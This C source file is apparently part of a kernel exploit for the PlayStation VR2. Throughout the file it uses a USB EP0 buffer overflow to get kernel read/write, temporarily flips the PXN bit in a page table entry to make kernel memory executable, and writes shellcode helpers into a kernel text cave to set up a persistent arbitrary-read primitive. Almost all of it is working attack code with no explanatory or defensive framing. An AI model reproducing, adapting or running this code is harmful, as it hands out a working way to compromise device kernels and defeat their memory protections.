#include "kernel_bootstrap_internal.h"
#include "firmware_0600_internal.h"
#include "kernel_images_internal.h"

#include <string.h>

#define PTE_PXN_BIT 53U
#define INLINE_BATCH_SOURCE_OFFSET 8U
#define INLINE_BATCH_SOURCE_CAPACITY 56U
/* Keep the established 2 KiB inspection window independent of the smaller
 * bounded EP0 transfer block. */
#define TEXT_CAVE_SNAPSHOT_SIZE 2048U
#define TEXT_CAVE_SNAPSHOT_START \
    (PSVR2_TEXT_CAVE_END - TEXT_CAVE_SNAPSHOT_SIZE)

_Static_assert(TEXT_CAVE_SNAPSHOT_START <= PSVR2_TEXT_CAVE_START,
               "text-cave snapshot must cover every helper");
_Static_assert((TEXT_CAVE_SNAPSHOT_START & UINT64_C(0xfff)) +
                       TEXT_CAVE_SNAPSHOT_SIZE <=
                   UINT64_C(0x1000),
               "block snapshot must not cross a kernel page");

typedef struct {
    uint8_t temporary[PSVR2_TEMP_HELPER_SIZE];
    uint8_t direct_context[PSVR2_DIRECT_CONTEXT_SC_SIZE];
    uint8_t patch[PSVR2_PATCH_SC_SIZE];
    uint8_t batch_patch[PSVR2_BATCH_PATCH_SC_SIZE];
    uint8_t previous_cold_cleanup[PSVR2_COLD_CLEANUP_SIZE];
    uint8_t direct_read[PSVR2_DIRECT_READ_SC_SIZE];
    uint8_t cleanup[PSVR2_TLBI_CLEANUP_SIZE];
    uint8_t str[PSVR2_STR_HELPER_SIZE];
} bootstrap_images;

static bool normalize_direct_reader_block(
    psvr2_krw *krw, const bootstrap_images *images);

bool psvr2_kernel_probe_slot_is_pristine(psvr2_krw *krw) {
    uint8_t bytes[PSVR2_TEMP_HELPER_SIZE];
    if (!psvr2_krw_read_ex(
            krw, krw->ex->constants->fw.kernel_probe_byte,
            bytes, sizeof(bytes), true, false))
        return false;
    for (size_t index = 0; index < sizeof(bytes); ++index)
        if (bytes[index] != UINT8_C(0xff)) return false;
    return true;
}

bool psvr2_kernel_read_u32_nonfatal(
    psvr2_krw *krw, uint64_t address, uint32_t *value) {
    uint8_t bytes[4];
    if (!value ||
        !psvr2_krw_read_ex(
            krw, address, bytes, sizeof(bytes), true, false))
        return false;
    *value = psvr2_load_le32(bytes);
    return true;
}

static bool exact_bytes(
    psvr2_krw *krw, uint64_t address,
    const void *expected, size_t length) {
    uint8_t observed[16];
    return expected && length <= sizeof(observed) &&
           psvr2_krw_read_ex(
               krw, address, observed, length, true, false) &&
           memcmp(observed, expected, length) == 0;
}

bool psvr2_kernel_exact_execution_anchors(psvr2_krw *krw) {
    if (!krw || !krw->ex || !krw->ex->constants)
        return false;
    psvr2_kernel_anchor anchors[PSVR2_KERNEL_ANCHOR_COUNT];
    psvr2_kernel_execution_anchors(
        krw->ex->constants, anchors);
    for (size_t index = 0;
         index < PSVR2_KERNEL_ANCHOR_COUNT; ++index)
        if (!exact_bytes(
                krw, anchors[index].address,
                anchors[index].bytes, anchors[index].length))
            return false;
    return true;
}

bool psvr2_kernel_certify_live_profile(psvr2_krw *krw) {
    if (!krw || !krw->ex || !krw->ex->usb ||
        !krw->ex->constants)
        return false;

    psvr2_constants *constants = krw->ex->constants;
    const uint64_t generation =
        krw->ex->usb->connection_generation;
    psvr2_constants_invalidate_live_state(constants);
    if (!psvr2_kernel_exact_execution_anchors(krw))
        return false;

    if (krw->ex->usb->connection_generation != generation ||
        krw->ex->connection_generation != generation ||
        krw->connection_generation != generation ||
        !krw->ex->direct_read_ready)
        return false;

    constants->live_profile_certified = true;
    constants->certified_connection_generation = generation;
    if (!psvr2_constants_shellcode_execution_safe(constants)) {
        psvr2_constants_invalidate_live_state(constants);
        return false;
    }
    return true;
}

bool psvr2_kernel_patch_word_with_helper(
    psvr2_krw *krw, uint64_t target, uint32_t instruction) {
    uint8_t payload[PSVR2_TEXT_PATCH_PAYLOAD_SIZE];
    if (psvr2_build_text_patch_payload(
            krw->ex->constants, payload, target, instruction,
            &krw->regs) != sizeof(payload))
        return false;

    (void)psvr2_krw_trigger_overflow(
        krw, payload, sizeof(payload), 2500);

    for (unsigned attempt = 0; attempt < 3; ++attempt) {
        uint32_t observed;
        if (psvr2_kernel_read_u32_nonfatal(
                krw, target, &observed) &&
            observed == instruction &&
            psvr2_kernel_probe_slot_is_pristine(krw))
            return true;
    }
    return false;
}

static bool trigger_tlbi(
    psvr2_krw *krw, uint64_t next,
    uint64_t x19, uint64_t x20, uint64_t x21) {
    uint8_t payload[PSVR2_TLBI_PAYLOAD_SIZE];
    if (psvr2_build_tlbi_payload(
            krw->ex->constants, payload,
            next, x19, x20, x21) != sizeof(payload))
        return false;
    bool sent = psvr2_krw_trigger_overflow(
        krw, payload, sizeof(payload), 2500);
    return sent;
}

static bool write_byte_preserving_endpoint(
    psvr2_krw *krw, uint64_t address, uint8_t value) {
    for (unsigned attempt = 0; attempt < 5; ++attempt) {
        uint8_t observed;
        /* The byte writer restores mep->busy to zero before returning. */
        if (psvr2_krw_write_byte_blind(krw, address, value) &&
            psvr2_krw_read_ex(
                krw, address, &observed, 1, true, false) &&
            observed == value)
            return true;
    }
    return false;
}

static bool bytes_match(
    psvr2_krw *krw, uint64_t address,
    const uint8_t *expected, size_t length) {
    uint8_t observed[PSVR2_TEMP_HELPER_SIZE];
    return length <= sizeof(observed) &&
           psvr2_krw_read_ex(
               krw, address, observed, length, true, false) &&
           memcmp(observed, expected, length) == 0;
}

static bool read_text_cave_snapshot(
    psvr2_krw *krw, uint8_t snapshot[TEXT_CAVE_SNAPSHOT_SIZE]) {
    return psvr2_krw_read_ex(
        krw, TEXT_CAVE_SNAPSHOT_START, snapshot,
        TEXT_CAVE_SNAPSHOT_SIZE, true, false);
}

static const uint8_t *text_cave_snapshot_at(
    const uint8_t snapshot[TEXT_CAVE_SNAPSHOT_SIZE],
    uint64_t address, size_t length) {
    if (!snapshot || address < TEXT_CAVE_SNAPSHOT_START ||
        length > TEXT_CAVE_SNAPSHOT_SIZE ||
        address - TEXT_CAVE_SNAPSHOT_START >
            TEXT_CAVE_SNAPSHOT_SIZE - length)
        return NULL;
    return snapshot + (size_t)(address - TEXT_CAVE_SNAPSHOT_START);
}

static bool snapshot_bytes_match(
    const uint8_t snapshot[TEXT_CAVE_SNAPSHOT_SIZE],
    uint64_t address, const uint8_t *expected, size_t length) {
    const uint8_t *observed =
        text_cave_snapshot_at(snapshot, address, length);
    return observed && expected &&
           memcmp(observed, expected, length) == 0;
}

static bool temporary_bytes_owned(
    psvr2_krw *krw, uint64_t address,
    const uint8_t *expected, size_t length, bool *pristine) {
    uint8_t observed[PSVR2_TEMP_HELPER_SIZE];
    if (!expected || !pristine || length > sizeof(observed) ||
        !psvr2_krw_read_ex(
            krw, address, observed, length, true, false))
        return false;

    *pristine = true;
    for (size_t index = 0; index < length; ++index) {
        if (observed[index] != UINT8_C(0xff))
            *pristine = false;
        if (observed[index] != UINT8_C(0xff) &&
            observed[index] != expected[index])
            return false;
    }
    return true;
}

static bool clear_temporary_slow(
    psvr2_krw *krw, uint64_t address,
    const uint8_t *expected, size_t length) {
    bool cleared = true;
    for (size_t index = 0; index < length; ++index)
        if (expected[index] != UINT8_C(0xff))
            cleared =
                write_byte_preserving_endpoint(
                    krw, address + index, UINT8_C(0xff)) &&
                cleared;
    return cleared && psvr2_kernel_probe_slot_is_pristine(krw);
}

static bool build_bootstrap_images(
    psvr2_krw *krw, const psvr2_pte *mapping,
    bootstrap_images *images) {
    const uint64_t temp =
        krw->ex->constants->fw.kernel_probe_byte;
    const unsigned pxn_byte = PTE_PXN_BIT / 8U;
    return psvr2_build_patch_helper(
               krw->ex->constants, images->patch) &&
           psvr2_build_direct_context_helper(
               krw->ex->constants, images->direct_context) &&
           psvr2_build_batch_patch_helper(
               krw->ex->constants, images->batch_patch) &&
           psvr2_build_cold_cleanup_helper(
               krw->ex->constants,
               krw->ex->constants->fw.batch_patch_helper,
               images->previous_cold_cleanup) &&
           psvr2_build_direct_read_helper(
               krw->ex->constants, images->direct_read) &&
           psvr2_build_tlbi_cleanup(
               krw->ex->constants, images->cleanup, krw->regs.x22) &&
           psvr2_build_str_helper(
               krw->ex->constants, images->str) &&
           psvr2_build_temporary_patch_helper(
               krw->ex->constants, temp, krw->regs.mep,
               mapping->address + pxn_byte,
               (uint8_t)(mapping->value >> (pxn_byte * 8U)),
               images->temporary);
}

static bool helpers_match(
    psvr2_krw *krw, const bootstrap_images *images) {
    uint8_t snapshot[TEXT_CAVE_SNAPSHOT_SIZE];
    return read_text_cave_snapshot(krw, snapshot) &&
           snapshot_bytes_match(
               snapshot, PSVR2_DIRECT_CONTEXT_SC,
               images->direct_context, sizeof(images->direct_context)) &&
           snapshot_bytes_match(
               snapshot, PSVR2_PATCH_SC,
               images->patch, sizeof(images->patch)) &&
           snapshot_bytes_match(
               snapshot, PSVR2_BATCH_PATCH_SC,
               images->batch_patch, sizeof(images->batch_patch)) &&
           snapshot_bytes_match(
               snapshot, PSVR2_DIRECT_READ_SC,
               images->direct_read, sizeof(images->direct_read)) &&
           snapshot_bytes_match(
               snapshot, PSVR2_TLBI_CLEANUP_SC,
               images->cleanup, sizeof(images->cleanup)) &&
           snapshot_bytes_match(
               snapshot, PSVR2_STR_SC,
               images->str, sizeof(images->str));
}

static bool build_installed_images(
    psvr2_krw *krw, bootstrap_images *images) {
    memset(images, 0, sizeof(*images));
    return psvr2_build_patch_helper(
               krw->ex->constants, images->patch) &&
           psvr2_build_direct_context_helper(
               krw->ex->constants, images->direct_context) &&
           psvr2_build_batch_patch_helper(
               krw->ex->constants, images->batch_patch) &&
           psvr2_build_cold_cleanup_helper(
               krw->ex->constants,
               krw->ex->constants->fw.batch_patch_helper,
               images->previous_cold_cleanup) &&
           psvr2_build_direct_read_helper(
               krw->ex->constants, images->direct_read) &&
           psvr2_build_tlbi_cleanup(
               krw->ex->constants, images->cleanup, krw->regs.x22) &&
           psvr2_build_str_helper(
               krw->ex->constants, images->str);
}

static bool installed_helpers_match(psvr2_krw *krw) {
    bootstrap_images images;
    return build_installed_images(krw, &images) &&
           normalize_direct_reader_block(krw, &images) &&
           helpers_match(krw, &images);
}

static bool live_ep0_matches(psvr2_krw *krw) {
    uint8_t pointer[sizeof(uint64_t)];
    return krw->regs.mep >= PSVR2_PAGE_OFFSET_BASE &&
           krw->regs.x21 >= PSVR2_PAGE_OFFSET_BASE &&
           psvr2_krw_read_ex(
               krw,
               krw->regs.x21 + PSVR2_MTU3_EP0_POINTER_OFFSET,
               pointer, sizeof(pointer), true, false) &&
           psvr2_load_le64(pointer) == krw->regs.mep;
}

static bool enable_and_validate_direct_read(psvr2_krw *krw) {
    uint64_t live[4];
    bool was_ready = krw->ex->direct_read_ready;
    if (!psvr2_exploit_enable_direct_read(krw->ex)) {
        fputs("[-] direct read: exact-text self-test mismatch\n", stderr);
        return false;
    }
    if (!psvr2_exploit_direct_context(krw->ex, live)) {
        fputs("[-] direct read: live-context transfer failed\n", stderr);
        krw->ex->direct_read_ready = false;
        return false;
    }
    if (live[0] != krw->regs.req ||
        live[1] != krw->regs.mep ||
        live[2] != krw->regs.x21 ||
        live[3] != krw->regs.x22 ||
        !live_ep0_matches(krw)) {
        fprintf(stderr,
                "[-] direct read: context mismatch "
                "req=%llx/%llx mep=%llx/%llx "
                "mtu=%llx/%llx state=%llx/%x\n",
                (unsigned long long)live[0],
                (unsigned long long)krw->regs.req,
                (unsigned long long)live[1],
                (unsigned long long)krw->regs.mep,
                (unsigned long long)live[2],
                (unsigned long long)krw->regs.x21,
                (unsigned long long)live[3],
                krw->regs.x22);
        krw->ex->direct_read_ready = false;
        return false;
    }
    if (!was_ready)
        puts("[+] Direct arbitrary read ready.");
    return true;
}

static bool patch_helper_matches(
    psvr2_krw *krw, const bootstrap_images *images) {
    /*
     * Keep this check on the qword/byte reader entries.  In particular, do
     * not issue a block read until migrate_direct_helpers() has ruled out or
     * repaired the previous 2 KiB block-copy loop.
     */
    return bytes_match(
        krw, PSVR2_PATCH_SC,
        images->patch, sizeof(images->patch));
}

static bool snapshot_helper_words_owned(
    const uint8_t snapshot[TEXT_CAVE_SNAPSHOT_SIZE],
    uint64_t address, const uint8_t *expected, size_t length,
    const uint8_t *owned_previous, size_t previous_length) {
    const uint8_t *observed =
        text_cave_snapshot_at(snapshot, address, length);
    if (!observed || !expected || !length || (length & 3U) != 0)
        return false;
    for (size_t offset = 0; offset < length; offset += 4) {
        uint32_t observed_word = psvr2_load_le32(observed + offset);
        uint32_t wanted = psvr2_load_le32(expected + offset);
        bool previous_matches =
            owned_previous && offset < previous_length &&
            observed_word == psvr2_load_le32(owned_previous + offset);
        if (observed_word != 0 && observed_word != wanted &&
            !previous_matches)
            return false;
    }
    return true;
}

static bool patch_word_with_existing_helper(
    psvr2_krw *krw, uint64_t target, uint32_t instruction,
    const uint32_t *owned_previous) {
    uint32_t observed;
    if (!psvr2_kernel_read_u32_nonfatal(krw, target, &observed))
        return false;
    if (observed == instruction)
        return true;
    if (observed != 0 &&
        (!owned_previous || observed != *owned_previous))
        return false;

    uint8_t payload[PSVR2_TEXT_PATCH_PAYLOAD_SIZE];
    if (psvr2_build_text_patch_payload(
            krw->ex->constants, payload, target, instruction,
            &krw->regs) != sizeof(payload))
        return false;
    (void)psvr2_krw_trigger_overflow(
        krw, payload, sizeof(payload), 2500);

    for (unsigned attempt = 0; attempt < 3; ++attempt)
        if (psvr2_kernel_read_u32_nonfatal(
                krw, target, &observed) &&
            observed == instruction)
            return true;
    return false;
}

static bool install_helper_with_existing_patch(
    psvr2_krw *krw, uint64_t address,
    const uint8_t *image, size_t length,
    const uint8_t *owned_previous, size_t previous_length) {
    for (size_t offset = 0; offset < length; offset += 4) {
        uint32_t previous;
        const uint32_t *previous_pointer = NULL;
        if (owned_previous && offset < previous_length) {
            previous = psvr2_load_le32(owned_previous + offset);
            previous_pointer = &previous;
        }
        if (!patch_word_with_existing_helper(
                krw, address + offset,
                psvr2_load_le32(image + offset),
                previous_pointer))
            return false;
    }
    return bytes_match(krw, address, image, length);
}

static bool install_helper_with_timing(
    psvr2_krw *krw, const char *label, uint64_t address,
    const uint8_t *image, size_t length,
    const uint8_t *owned_previous, size_t previous_length) {
    double started = psvr2_now();
    bool installed = install_helper_with_existing_patch(
        krw, address, image, length,
        owned_previous, previous_length);
    psvr2_report_timing(label, started, installed);
    return installed;
}

static bool install_helper_with_inline_batch(
    psvr2_krw *krw, uint64_t address,
    const uint8_t *image, size_t length) {
    if (!krw || !krw->ex || !krw->ex->constants ||
        !krw->ex->request_buffer || !image || !length ||
        (length & 3U) != 0)
        return false;

    for (size_t offset = 0; offset < length;) {
        size_t chunk = psvr2_min_size(
            INLINE_BATCH_SOURCE_CAPACITY, length - offset);
        chunk &= ~(size_t)3U;
        if (!chunk)
            return false;

        uint8_t payload[PSVR2_WRITE_PAYLOAD_SIZE];
        if (psvr2_build_fast_write_payload(
                krw->ex->constants, payload,
                address + offset,
                krw->ex->request_buffer + INLINE_BATCH_SOURCE_OFFSET,
                krw->spinlock,
                (uint64_t)(chunk / 4U) << 8,
                PSVR2_BATCH_PATCH_SC) != sizeof(payload))
            return false;
        memcpy(
            payload + INLINE_BATCH_SOURCE_OFFSET,
            image + offset, chunk);
        if (!psvr2_krw_trigger_overflow(
                krw, payload, sizeof(payload), 2500) ||
            !bytes_match(
                krw, address + offset, image + offset, chunk))
            return false;
        offset += chunk;
    }
    return bytes_match(krw, address, image, length);
}

static bool install_inline_helper_with_timing(
    psvr2_krw *krw, const char *label, uint64_t address,
    const uint8_t *image, size_t length) {
    double started = psvr2_now();
    bool installed = install_helper_with_inline_batch(
        krw, address, image, length);
    psvr2_report_timing(label, started, installed);
    return installed;
}

static bool normalize_direct_reader_block(
    psvr2_krw *krw, const bootstrap_images *images) {
    uint8_t previous[PSVR2_DIRECT_READ_SC_SIZE];
    uint8_t observed[PSVR2_DIRECT_READ_SC_SIZE];
    if (!krw || !images)
        return false;
    memcpy(previous, images->direct_read, sizeof(previous));
    /* The previous helper copied 128 * 16 bytes. Only this MOVZ differs. */
    const uint32_t previous_loop = UINT32_C(0xd2801002);
    psvr2_store_le32(previous + 52, previous_loop);

    /*
     * This image is deliberately shorter than the block-read threshold, so
     * it is fetched only through the qword/byte entries. A previous block entry
     * must never execute after libcomposite has adopted the 1 KiB EP0 cap.
     */
    if (!psvr2_krw_read_ex(
            krw, PSVR2_DIRECT_READ_SC,
            observed, sizeof(observed), true, false))
        return false;
    if (memcmp(observed, images->direct_read, sizeof(observed)) == 0)
        return true;
    if (memcmp(observed, previous, sizeof(observed)) != 0 ||
        !patch_helper_matches(krw, images)) {
        fputs("[-] bootstrap: installed direct reader is not an exact "
              "owned image\n", stderr);
        return false;
    }
    return patch_word_with_existing_helper(
               krw, PSVR2_DIRECT_READ_SC + 52,
               psvr2_load_le32(images->direct_read + 52),
               &previous_loop) &&
           bytes_match(
               krw, PSVR2_DIRECT_READ_SC,
               images->direct_read, sizeof(images->direct_read));
}

static bool migrate_direct_helpers(psvr2_krw *krw) {
    bootstrap_images images;
    uint8_t allocator[PSVR2_ALLOC_HELPER_SIZE];
    if (!build_installed_images(krw, &images) ||
        !psvr2_build_workspace_allocator(
            krw->ex->constants, allocator) ||
        !patch_helper_matches(krw, &images) ||
        !normalize_direct_reader_block(krw, &images))
        return false;

    puts("[*] Validating the installed patch helper state...");
    double preflight_started = psvr2_now();
    uint8_t snapshot[TEXT_CAVE_SNAPSHOT_SIZE];
    bool preflight_ok =
        psvr2_kernel_exact_execution_anchors(krw) &&
        live_ep0_matches(krw) &&
        read_text_cave_snapshot(krw, snapshot) &&
        snapshot_helper_words_owned(
            snapshot, PSVR2_ALLOC_SC, allocator, sizeof(allocator),
            NULL, 0) &&
        snapshot_helper_words_owned(
            snapshot, PSVR2_BATCH_PATCH_SC, images.batch_patch,
            sizeof(images.batch_patch), images.previous_cold_cleanup,
            sizeof(images.previous_cold_cleanup)) &&
        snapshot_helper_words_owned(
            snapshot, PSVR2_TLBI_CLEANUP_SC,
            images.cleanup, sizeof(images.cleanup), NULL, 0) &&
        snapshot_helper_words_owned(
            snapshot, PSVR2_STR_SC,
            images.str, sizeof(images.str), NULL, 0) &&
        snapshot_helper_words_owned(
            snapshot, PSVR2_DIRECT_CONTEXT_SC,
            images.direct_context, sizeof(images.direct_context),
            NULL, 0) &&
        snapshot_helper_words_owned(
            snapshot, PSVR2_DIRECT_READ_SC,
            images.direct_read, sizeof(images.direct_read),
            NULL, 0);
    psvr2_report_timing(
        "installed helper preflight", preflight_started, preflight_ok);
    if (!preflight_ok)
        return false;

    puts("[*] Extending the exact installed patch helper set...");
    double started = psvr2_now();
    bool installed =
        install_helper_with_timing(
            krw, "batch text-patch helper",
            PSVR2_BATCH_PATCH_SC,
            images.batch_patch, sizeof(images.batch_patch),
            images.previous_cold_cleanup,
            sizeof(images.previous_cold_cleanup)) &&
        install_inline_helper_with_timing(
            krw, "workspace allocator helper (inline batch)",
            PSVR2_ALLOC_SC,
            allocator, sizeof(allocator)) &&
        install_inline_helper_with_timing(
            krw, "TLBI cleanup helper",
            PSVR2_TLBI_CLEANUP_SC, images.cleanup,
            sizeof(images.cleanup)) &&
        install_inline_helper_with_timing(
            krw, "STR helper",
            PSVR2_STR_SC, images.str, sizeof(images.str)) &&
        install_inline_helper_with_timing(
            krw, "direct-context helper",
            PSVR2_DIRECT_CONTEXT_SC, images.direct_context,
            sizeof(images.direct_context)) &&
        install_inline_helper_with_timing(
            krw, "direct-read helper",
            PSVR2_DIRECT_READ_SC, images.direct_read,
            sizeof(images.direct_read));
    bool valid = installed &&
           bytes_match(
               krw, PSVR2_ALLOC_SC,
               allocator, sizeof(allocator)) &&
           helpers_match(krw, &images) &&
           enable_and_validate_direct_read(krw);
    psvr2_report_timing(
        "installed helper-set extension", started, valid);
    return valid;
}

static bool stage_temporary_helper(
    psvr2_krw *krw, uint64_t address,
    const uint8_t code[PSVR2_TEMP_HELPER_SIZE]) {
    bool pristine;
    if (!temporary_bytes_owned(
            krw, address, code, PSVR2_TEMP_HELPER_SIZE, &pristine)) {
        fputs("[-] bootstrap: temporary padding contains foreign bytes\n",
              stderr);
        return false;
    }

    bool staged =
        !pristine &&
        bytes_match(krw, address, code, PSVR2_TEMP_HELPER_SIZE);
    if (!pristine && !staged) {
        puts("[*] Recovering an exact incomplete temporary helper...");
        if (!clear_temporary_slow(
                krw, address, code, PSVR2_TEMP_HELPER_SIZE)) {
            fputs("[-] bootstrap: temporary helper recovery failed\n",
                  stderr);
            return false;
        }
    }

    if (!staged) {
        for (size_t index = 0; index < PSVR2_TEMP_HELPER_SIZE; ++index) {
            if (code[index] == UINT8_C(0xff)) continue;
            if (!write_byte_preserving_endpoint(
                    krw, address + index, code[index])) {
                fprintf(stderr,
                        "[-] bootstrap: temporary helper staging failed "
                        "at +0x%zx\n", index);
                (void)clear_temporary_slow(
                    krw, address, code, PSVR2_TEMP_HELPER_SIZE);
                return false;
            }
        }
    }

    if (bytes_match(krw, address, code, PSVR2_TEMP_HELPER_SIZE))
        return true;
    fputs("[-] bootstrap: temporary helper verification failed\n", stderr);
    (void)clear_temporary_slow(
        krw, address, code, PSVR2_TEMP_HELPER_SIZE);
    return false;
}

static bool install_words_with_temporary_helper(
    psvr2_krw *krw, uint64_t temporary,
    uint64_t target, const uint8_t *data, size_t length,
    const uint8_t *owned_previous, size_t previous_length) {
    for (size_t offset = 0; offset < length; offset += 4) {
        uint32_t wanted = psvr2_load_le32(data + offset);
        uint32_t observed;
        if (!psvr2_kernel_read_u32_nonfatal(
                krw, target + offset, &observed))
            return false;
        bool previous_matches =
            owned_previous && offset < previous_length &&
            observed == psvr2_load_le32(owned_previous + offset);
        if (observed != 0 && observed != wanted && !previous_matches)
            return false;
        if (observed == wanted) continue;
        if (!trigger_tlbi(
                krw, temporary, wanted,
                target + offset, krw->spinlock) ||
            !psvr2_kernel_read_u32_nonfatal(
                krw, target + offset, &observed) ||
            observed != wanted)
            return false;
    }
    return true;
}

static bool restore_nonexecutable_mapping(
    psvr2_krw *krw, uint64_t temporary,
    const psvr2_pte *original) {
    for (unsigned attempt = 0; attempt < 3; ++attempt) {
        (void)trigger_tlbi(
            krw, temporary + PSVR2_TEMP_FINALIZER_OFFSET, 0,
            krw->regs.mep, krw->spinlock);
        psvr2_pte after;
        bool table_restored =
            psvr2_get_pte_ex(
                krw, temporary, &after, true, false) &&
            after.address == original->address &&
            after.value == original->value;
        bool finalized = table_restored && live_ep0_matches(krw);
        if (finalized) return true;
        if (table_restored) break;
    }
    fputs("[-] bootstrap: atomic PXN finalizer did not verify\n", stderr);
    return false;
}

static bool clear_temporary_helper(
    psvr2_krw *krw, uint64_t address,
    const bootstrap_images *images) {
    bool cleared = true;
    if (bytes_match(
            krw, PSVR2_STR_SC,
            images->str, sizeof(images->str))) {
        for (size_t offset = 0;
             offset < sizeof(images->temporary); offset += 8)
            cleared =
                psvr2_krw_write_u64_fast(
                    krw, address + offset, UINT64_MAX) &&
                cleared;
    } else {
        cleared = clear_temporary_slow(
            krw, address, images->temporary,
            sizeof(images->temporary));
    }
    return cleared && psvr2_kernel_probe_slot_is_pristine(krw);
}

bool psvr2_kernel_bootstrap_helpers(psvr2_krw *krw) {
    if (installed_helpers_match(krw)) {
        if (krw->ex->direct_read_ready)
            return true;
        return enable_and_validate_direct_read(krw);
    }
    if (migrate_direct_helpers(krw))
        return true;
    if (!live_ep0_matches(krw)) {
        fputs("[-] bootstrap: live EP0/MTU3 relationship is not exact\n",
              stderr);
        return false;
    }

    const uint64_t temporary =
        krw->ex->constants->fw.kernel_probe_byte;
    psvr2_pte mapping;
    if (!psvr2_get_pte_ex(
            krw, temporary, &mapping, true, false) ||
        mapping.level != PSVR2_PTE_L2_BLOCK ||
        ((mapping.value >> 6) & 3U) != 0 ||
        ((mapping.value >> PTE_PXN_BIT) & 1U) == 0) {
        fputs("[-] bootstrap: exact NX mapping check failed\n", stderr);
        return false;
    }

    bootstrap_images images;
    if (!build_bootstrap_images(krw, &mapping, &images)) {
        fputs("[-] bootstrap: helper encoding failed\n", stderr);
        return false;
    }
    if (!stage_temporary_helper(
            krw, temporary, images.temporary))
        return false;

    const unsigned pxn_byte = PTE_PXN_BIT / 8U;
    uint64_t executable_mapping =
        mapping.value & ~(UINT64_C(1) << PTE_PXN_BIT);
    if (!write_byte_preserving_endpoint(
            krw, mapping.address + pxn_byte,
            (uint8_t)(executable_mapping >> (pxn_byte * 8U)))) {
        fputs("[-] bootstrap: temporary PXN transition failed\n", stderr);
        return false;
    }

    psvr2_pte executable_check;
    bool executable_ready =
        psvr2_get_pte_ex(
            krw, temporary, &executable_check, true, false) &&
        executable_check.address == mapping.address &&
        executable_check.value == executable_mapping;
    if (!executable_ready) {
        fputs("[-] bootstrap: executable PTE verification failed; "
              "restoring without execution\n", stderr);
        (void)write_byte_preserving_endpoint(
            krw, mapping.address + pxn_byte,
            (uint8_t)(mapping.value >> (pxn_byte * 8U)));
        (void)clear_temporary_slow(
            krw, temporary, images.temporary,
            sizeof(images.temporary));
        return false;
    }

    bool installed =
        install_words_with_temporary_helper(
            krw, temporary, PSVR2_TLBI_CLEANUP_SC,
            images.cleanup, sizeof(images.cleanup), NULL, 0) &&
        install_words_with_temporary_helper(
            krw, temporary, PSVR2_DIRECT_CONTEXT_SC,
            images.direct_context, sizeof(images.direct_context), NULL, 0) &&
        install_words_with_temporary_helper(
            krw, temporary, PSVR2_STR_SC,
            images.str, sizeof(images.str), NULL, 0) &&
        install_words_with_temporary_helper(
            krw, temporary, PSVR2_BATCH_PATCH_SC,
            images.batch_patch, sizeof(images.batch_patch),
            images.previous_cold_cleanup,
            sizeof(images.previous_cold_cleanup)) &&
        install_words_with_temporary_helper(
            krw, temporary, PSVR2_DIRECT_READ_SC,
            images.direct_read, sizeof(images.direct_read), NULL, 0) &&
        install_words_with_temporary_helper(
            krw, temporary, PSVR2_PATCH_SC,
            images.patch, sizeof(images.patch), NULL, 0);

    if (!restore_nonexecutable_mapping(
            krw, temporary, &mapping))
        return false;

    bool cleared =
        clear_temporary_helper(krw, temporary, &images);
    bool exact_helpers = helpers_match(krw, &images);
    bool direct_read =
        exact_helpers && enable_and_validate_direct_read(krw);
    if (!installed)
        fputs("[-] bootstrap: permanent helper installation failed\n", stderr);
    if (!exact_helpers)
        fputs("[-] bootstrap: permanent helper verification failed\n", stderr);
    if (!cleared)
        fputs("[-] bootstrap: temporary padding cleanup failed\n", stderr);
    if (!direct_read)
        fputs("[-] bootstrap: direct-read helper self-test failed\n", stderr);
    return installed && exact_helpers && cleared && direct_read;
}
